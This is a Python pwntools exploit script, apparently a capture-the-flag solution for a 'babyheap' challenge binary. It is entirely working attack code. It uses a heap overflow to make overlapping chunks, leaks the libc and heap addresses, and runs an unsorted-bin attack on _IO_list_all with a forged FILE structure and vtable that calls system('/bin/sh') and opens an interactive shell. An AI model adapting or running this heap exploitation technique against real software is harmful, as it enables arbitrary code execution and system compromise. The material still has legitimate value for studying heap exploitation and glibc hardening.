from pwn import *
io = process('./babyheap')
context.log_level = 'debug'
pause()

def menu(choice):
    io.recvuntil('Command: ')
    io.sendline(str(choice))

def Allocate(size):
    menu(1)
    io.recvuntil('Size: ')
    io.sendline(str(size))

def Fill(idx, size, content):
    menu(2)
    io.recvuntil('Index: ')
    io.sendline(str(idx))
    io.recvuntil('Size: ')
    io.sendline(str(size))
    io.recvuntil('Content: ')
    io.send(content)

def Free(idx):
    menu(3)
    io.recvuntil('Index: ')
    io.sendline(str(idx))

def Dump(idx):
    menu(4)
    io.recvuntil('Index: ')
    io.sendline(str(idx))
    

Allocate(0x80) #0
Allocate(0x80) #1
Allocate(0x80) #2
Allocate(0x80) #3
Allocate(0x80) #4
Fill(0, 0x90, 'a' * 0x80 + p64(0) + p64(0x90 + 0x90 + 1))
Free(1)
Allocate(0x80 + 0x90) #alloca 1 again 
Fill(1, 0x80 + 0x90, 'a' * 0x80 + p64(0) + p64(0x91) + 'b' * 0x80) #overlap
Free(2)

Dump(1) 
io.recvuntil(p64(0x91))
libc_addr = u64(io.recvn(8))
log.info('libc_addr :' + hex(libc_addr))
libc_base = libc_addr - 3951704
IO_list = libc_base + 0x3c5600
system_addr = libc_base + 279504
main_arena = libc_base + 3951616

log.info('libc_base :' + hex(libc_base))
log.info('IO_list :' + hex(IO_list))
log.info('system_addr :' + hex(system_addr))
log.info('main_arena :' + hex(main_arena))

#leak heap addr by fastbin
Allocate(0x30) #2
Allocate(0x30) #5
Allocate(0x30) #6
Free(6)
Free(2)

Dump(1)
io.recvuntil(p64(0x41))
heap_addr = u64(io.recvn(8))
log.info('heap_addr :' + hex(heap_addr))

#clean heap
Free(3)
Free(4)
Free(5)

#now we make a unsorted bin
Allocate(0x400) #idx is 2
Allocate(0x10) #3
Free(2) #unsorted bin 2

#make another unsorted bin
#use chunk1 to overflow chunk2's fd
Allocate(0x300) #4
pay = 'A' * 0x80 + p64(0) + p64(0x311) + p64(main_arena + 88) + p64(IO_list - 0x10)
pay += 'B' * (0x400 - 0x10)
pay += p64(0)
pay += p64(0x111)
Fill(1, len(pay), pay)
Free(4) # next chunk's pre_inuse has been set as one so it wont be consolidated
pause()
#over write main_arena with fake tables
pay = 'A' * 0x80 + p64(0) + p64(0x311) + p64(main_arena + 0x88) + p64(IO_list - 0x10)
pay += 'B' * (0x300 - 0x10)
fake_chunk_and_fake_io_list = '' 
fake_chunk_and_fake_io_list+= '/bin/sh\x00' + p64(0x61) + p64(0xddaa) + p64(IO_list - 0x10)
fake_chunk_and_fake_io_list+=p64(0) #write_base
fake_chunk_and_fake_io_list+=p64(1) #write_ptr  satisfy fp->_IO_write_ptr > fp->_IO_write_base
fake_chunk_and_fake_io_list=fake_chunk_and_fake_io_list.ljust(0xc0,'\x00')
      
fake_chunk_and_fake_io_list+=p64(0xffffffffffffffff)  #here set fp->mode=-1 to bypass the check
fake_chunk_and_fake_io_list=fake_chunk_and_fake_io_list.ljust(0xd8,'\x00')
vtable = heap_addr - 560 + len(pay + fake_chunk_and_fake_io_list) + 8
fake_chunk_and_fake_io_list+=p64(vtable)
fake_chunk_and_fake_io_list+=p64(0) #dummy 0
fake_chunk_and_fake_io_list+=p64(0) #dummy 1
fake_chunk_and_fake_io_list+=p64(1)#finish addr
fake_chunk_and_fake_io_list+=p64(system_addr) #IO_OVERFLOW
fake_chunk_and_fake_io_list = pay + fake_chunk_and_fake_io_list
Fill(1, len(fake_chunk_and_fake_io_list), fake_chunk_and_fake_io_list)
pause()
Allocate(0x100)
io.interactive()
